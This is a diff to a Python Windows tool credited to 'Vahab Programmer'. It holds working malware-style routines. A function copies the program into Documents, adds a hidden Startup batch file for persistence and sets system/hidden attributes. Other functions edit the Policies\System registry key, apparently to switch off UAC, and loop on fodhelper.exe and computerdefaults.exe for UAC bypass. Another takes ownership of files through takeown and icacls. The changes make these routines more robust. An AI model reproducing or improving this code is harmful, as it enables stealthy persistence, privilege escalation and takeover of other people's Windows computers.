@@ -19,36 +19,38 @@ from pickle import dumps
 from subprocess import getoutput,call
 from sys import exit,orig_argv,setrecursionlimit
 from os import chdir,environ,system as run
-from os.path import basename,dirname,join
+from os.path import basename,dirname,join,exists
 from socket import socket,AF_INET,SOCK_STREAM,gaierror
 from shutil import copyfile
 from winreg import OpenKeyEx,HKEY_LOCAL_MACHINE,KEY_WRITE,SetValueEx,REG_DWORD,CloseKey
-from psutil import process_iter,AccessDenied
+from psutil import process_iter,AccessDenied,NoSuchProcess
 import sys
 __author__="Vahab Programmer https://github.com/Vahab-Programmer"
 __version="0.0.2"
 setrecursionlimit(1000000000)
 if hasattr(sys,"frozen"):
     runfile=join(sys._MEIPASS,"run.exe")
-else:runfile=join(dirname(__file__),"run.exe")
+else:runfile=join(dirname(orig_argv[0] if hasattr(sys,"frozen") else __file__),"run.exe")
 environ["exe"]=" ".join([i for i in orig_argv])
 def process_is_double(target:str=None)->int:
     if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
     else :target=" ".join([i for i in orig_argv])
     target=target.split(" ")[0]
     process = 0
-    if " ".join([i for i in orig_argv]) == target:
+    try:
+        if " ".join([i for i in orig_argv]) == target:
+            for i in process_iter():
+                try:
+                    if i.exe() == target:
+                        process +=1
+                except AccessDenied:pass
+            return process
         for i in process_iter():
             try:
-                if i.exe() == target:
-                    process +=1
+                if i.exe() == target:process +=1
             except AccessDenied:pass
         return process
-    for i in process_iter():
-        try:
-            if i.exe() == target:process +=1
-        except AccessDenied:pass
-    return process
+    except NoSuchProcess:return 0
 def process_is_exists(target:str)->bool:return target in (i.name() for i in process_iter())
 def split(target:str,tstr:str)->str:
     new_chars=[]
@@ -67,12 +69,14 @@ def connect()->None:
     except gaierror:connect()
     except OSError:connect()
 def CYS()->None:
-    copyfile(" ".join([i for i in orig_argv]),(r"C:\Users\{}\Documents\\"+basename(" ".join([i for i in orig_argv]))).format(environ.get("username")))
-    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "w") as file:
+    if exists(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username"))):run("attrib -s -h -r \"{}\"".format(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username"))))
+    if exists("C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(orig_argv[0] if hasattr(sys,"frozen") else __file__)):run("attrib -s -h -r \"C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(orig_argv[0] if hasattr(sys,"frozen") else __file__)+"\"")
+    run("copy /B /V /Y \"{}\" \"{}\"".format(orig_argv[0] if hasattr(sys,"frozen") else __file__,r"C:\Users\{}\Documents\\"+basename(" ".join([i for i in orig_argv]))).format(environ.get("username")))
+    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "wt") as file:
         file.write("""@Echo off
-start C:\\Users\\{0}\\Documents\\{1}
+start C:\\Users\\{}\\Documents\\{}
 exit""".format(environ.get("username"), basename(" ".join([i for i in orig_argv]))))
-    run("attrib +s +h +r C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(" ".join([i for i in orig_argv])))
+    run("attrib +s +h +r \"C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(" ".join([i for i in orig_argv]))+"\"")
     run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"".format(environ.get("username")))
 def LUA_OFF()->None:
     key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
@@ -87,10 +91,10 @@ def computerdefaults(target:str=None)->None:
     if " ".join([i for i in orig_argv]) == target:
         x=process_is_double()
         while not x<process_is_double():
-            call("{} computerdefaults.exe {}".format(runfile,target))
+            call("{} computerdefaults.exe \"{}\"".format(runfile,target))
             if x<process_is_double():return
         return None
-    while not process_is_exists(basename(target)):call("{} computerdefaults.exe {}".format(runfile,target))
+    while not process_is_exists(basename(target)):call("{} computerdefaults.exe \"{}\"".format(runfile,target))
 def fodhelper(target:str=None)->None:
     if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
     else :target=" ".join([i for i in orig_argv])
@@ -98,9 +102,9 @@ def fodhelper(target:str=None)->None:
     if " ".join([i for i in orig_argv]) == target:
         x=process_is_double()
         while not x<process_is_double():
-            call("{} fodhelper.exe {}".format(runfile,target))
+            call("{} fodhelper.exe \"{}\"".format(runfile,target))
             if x<process_is_double():return
-    while not process_is_exists(basename(target)):call("{} fodhelper.exe {}".format(runfile,target))
+    while not process_is_exists(basename(target)):call("{} fodhelper.exe \"{}\"".format(runfile,target))
 def FDR(target:str)->None:
     run("takeown /D Y /R /F {}".format(target))
     run("icacls {} /T /C /grant {}:(F,MA)".format(target,environ.get("username")))
